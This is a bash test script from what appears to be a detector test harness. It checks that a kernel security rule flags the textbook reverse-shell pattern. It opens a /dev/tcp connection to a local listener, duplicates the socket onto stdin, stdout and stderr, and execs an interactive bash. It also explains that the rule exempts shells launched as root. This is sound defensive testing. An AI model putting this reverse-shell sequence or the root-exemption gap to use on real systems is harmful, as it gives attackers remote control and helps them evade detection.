#!/usr/bin/env bash
# CFML-EXEC-003 — strict three-fd-remote reverse shell.
#
# What this proves: the textbook reverse-shell pattern is detected.
# We dial a local TCP listener (so the test is self-contained), dup
# the connected socket onto fds 0/1/2, then exec /bin/bash. The kernel
# sees bash's bprm_check_security with all three stdio fds pointing
# at the same AF_INET TCP socket in ESTABLISHED state — EXEC-003 fires.
#
# Loopback TCP qualifies. The detector only excludes AF_UNIX (which
# is what systemd uses), not loopback IPv4.
#
# Must run as a non-root user: the rule has a documented euid==0
# exemption (admin SSH→nc, incident-response rescue shells), so a
# reverse shell launched from root is suppressed by design. We drop
# to TEST_USER. EXEC-003 has no watched-uid gate — any non-root uid
# triggers the rule — so this works regardless of cfm_watched_uids
# population on panel hosts.

set -uo pipefail
. "$HARNESS_DIR/lib.sh"

PORT="${LISTENER_PORT:-4444}"
note "[EXEC-003] reverse-shell pattern against 127.0.0.1:$PORT as $TEST_USER"
ensure_test_user

# Start a minimal one-shot listener in the background. python3 is
# universally available on the test boxes the harness targets and
# avoids depending on nc / ncat / socat being installed.
listener_log=$(mktemp -t cfmpoc-listener.XXXXXX)
add_cleanup "rm -f '$listener_log'"
python3 -c "
import socket, sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('127.0.0.1', $PORT))
s.listen(1)
sys.stderr.write('listener up\n'); sys.stderr.flush()
c, addr = s.accept()
c.sendall(b'exit\n')   # so the bash -i loop ends and the helper returns
data = c.recv(4096)    # drain anything bash echoed
c.close(); s.close()
" >"$listener_log" 2>&1 &
listener_pid=$!
add_cleanup "kill -9 $listener_pid 2>/dev/null"

# Wait for the listener to be ready (it prints "listener up" to stderr).
deadline=$(( $(date +%s) + 5 ))
while ! grep -q "listener up" "$listener_log" 2>/dev/null; do
    if [ "$(date +%s)" -ge "$deadline" ]; then
        fail "listener never came up; aborting"
        exit 1
    fi
    sleep 0.1
done

start_pos=$(mark_log_position)

# Build the reverse-shell trigger. The /dev/tcp trick is bash-built-in
# and gives us a TCP socket on fd 3 without forking nc. We then dup
# fd 3 onto 0, 1, 2 and exec /bin/bash — the resulting bash invocation
# has all three stdio fds on the same AF_INET ESTABLISHED socket.
# Runs as TEST_USER so the rule's euid==0 exemption doesn't suppress.
trace "runuser -u $TEST_USER -- bash reverse shell -> 127.0.0.1:$PORT"
run_as_test_user bash -c "
    exec 3<>/dev/tcp/127.0.0.1/$PORT
    exec 0<&3 1>&3 2>&3
    exec /bin/bash -i
" &
trigger_pid=$!
wait "$trigger_pid" 2>/dev/null || true

if hit=$(expect_event "$start_pos" "CFML-EXEC-003"); then
    pass "EXEC-003 fired: $hit"
    exit 0
fi
fail "no CFML-EXEC-003 line in $LSM_LOG within ${EXPECT_TIMEOUT}s"
exit 1
